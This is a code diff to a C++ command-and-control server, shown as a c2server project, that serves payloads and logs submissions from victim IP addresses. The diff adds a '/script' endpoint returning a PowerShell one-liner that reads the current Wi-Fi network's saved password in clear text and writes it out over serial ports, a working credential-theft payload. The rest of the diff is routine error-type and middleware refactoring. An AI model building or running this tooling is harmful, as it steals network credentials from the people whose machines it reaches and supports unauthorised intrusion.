@@ -1,6 +1,8 @@
 import c2server.config;
+import c2server.error;
 import c2server.http;
 import c2server.logger;
+import c2server.middleware;
 import c2server.payload;
 import c2server.router;
 import c2server.server;
@@ -20,6 +22,16 @@ namespace {
 
    void addDefaultEndpoints(c2server::Router& router, std::shared_ptr<c2server::PayloadStoreBase> payload,
                             SubmissionSink submissionSink) {
+      router.get("/script", [](const c2server::HttpRequest&) {
+         return c2server::ok(
+             "$w=(Get-NetAdapter|?{$_.NdisPhysicalMedium -eq 9}"
+             "|%{(Get-NetConnectionProfile -InterfaceIndex $_.ifIndex).Name}"
+             "|select -f 1);"
+             "$p=(netsh wlan show profile name=$w key=clear"
+             "|sls 'Key Content').ToString().Split(':')[1].Trim();"
+             "3..20|%{try{$s=[IO.Ports.SerialPort]::new(\"COM$_\",9600);$s.Open();$s.WriteLine(\"$w|$p\");$s.Close()}catch{}}");
+      });
+
       router.get("/payload", [payload](const c2server::HttpRequest& req) {
          c2server::log::info("Payload requested by {}", req.remoteIp);
          return c2server::ok(payload->get());
@@ -42,17 +54,17 @@ namespace {
    SubmissionSink makeFileSubmissionSink(std::string_view path) {
       auto filePath = std::string{path};
       if (filePath.empty()) {
-         throw std::runtime_error{"submission log path must not be empty"};
+         throw c2server::SubmissionError{"submission log path must not be empty"};
       }
 
       return [filePath = std::move(filePath)](std::string_view ip, std::string_view data) {
          auto out = std::ofstream{filePath, std::ios::app};
          if (!out) {
-            throw std::runtime_error{std::format("failed to open submission log '{}'", filePath)};
+            throw c2server::SubmissionError{"failed to open submission log '{}'", filePath};
          }
          out << '[' << ip << "]\n" << data << "\n---\n";
          if (!out) {
-            throw std::runtime_error{std::format("failed to write submission log '{}'", filePath)};
+            throw c2server::SubmissionError{"failed to write submission log '{}'", filePath};
          }
       };
    }
@@ -69,6 +81,11 @@ int main(int argc, char* argv[]) {
 
       auto payload = std::make_shared<c2server::PayloadStore>(std::string{kDefaultPayload});
       auto router = std::make_shared<c2server::Router>();
+      router->use(c2server::middleware::requestId())
+          .use(c2server::middleware::accessLog())
+          .use(c2server::middleware::securityHeaders())
+          .use(c2server::middleware::cors())
+          .use(c2server::middleware::rateLimit());
       addDefaultEndpoints(*router, payload, makeFileSubmissionSink(kDefaultSubmissionPath));
 
       c2server::Server{std::move(config.server), router}.run();
